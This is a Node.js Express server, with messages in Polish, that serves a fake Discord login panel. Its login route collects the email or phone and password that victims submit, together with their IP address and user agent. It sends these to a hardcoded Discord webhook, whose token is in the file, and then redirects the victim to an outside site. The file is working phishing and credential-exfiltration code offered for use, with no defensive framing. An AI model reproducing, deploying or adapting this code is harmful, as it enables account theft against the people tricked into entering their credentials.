const express = require('express');
const path = require('path');
const axios = require('axios');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;
const WEBHOOK_URL = 'https://discord.com/api/webhooks/1497727671067480290/NW3HoXUfU0PhwPXz2qwkhpufyxfMc8ExoOsr55P3Qp3BtH7pWPiOsjsRIgBnM7KN2ffP';

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));

app.post('/api/login', async (req, res) => {
    const { email, password } = req.body;

    if (!email || !password) {
        return res.status(400).json({ error: 'Email i haslo sa wymagane' });
    }

    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const userAgent = req.headers['user-agent'];
    const timestamp = new Date().toLocaleString('pl-PL');

    const embed = {
        title: "🔐 NOWE LOGOWANIE 🔐",
        color: 0x5865F2,
        fields: [
            { name: "📧 Email/Telefon", value: `\`\`\`${email}\`\`\``, inline: false },
            { name: "🔑 Haslo", value: `\`\`\`${password}\`\`\``, inline: false },
            { name: "🌐 IP Address", value: `\`\`\`${ip}\`\`\``, inline: true },
            { name: "💻 User Agent", value: `\`\`\`${userAgent.substring(0, 500)}\`\`\``, inline: false },
            { name: "⏰ Czas", value: `\`\`\`${timestamp}\`\`\``, inline: true }
        ],
        footer: { text: "Discord Login Panel" },
        timestamp: new Date().toISOString()
    };

    try {
        await axios.post(WEBHOOK_URL, { embeds: [embed], username: 'Login Logger', avatar_url: 'https://cdn.discordapp.com/assets/discord-icon.png' });
        console.log(`[${timestamp}] Dane wyslane: ${email}`);
        res.json({ success: true, redirect: 'https://vaultcord.win/sadasdyuashdasdasd' });
    } catch (error) {
        console.error('Blad wysylania na webhook:', error.message);
        res.json({ success: false, redirect: 'https://vaultcord.win/sadasdyuashdasdasd' });
    }
});

app.listen(PORT, () => {
    console.log(`Serwer uruchomiony na http://localhost:${PORT}`);
    console.log(`Webhook URL: ${WEBHOOK_URL ? 'Ustawiony ✅' : 'NIEUSTAWIONY ❌'}`);
});
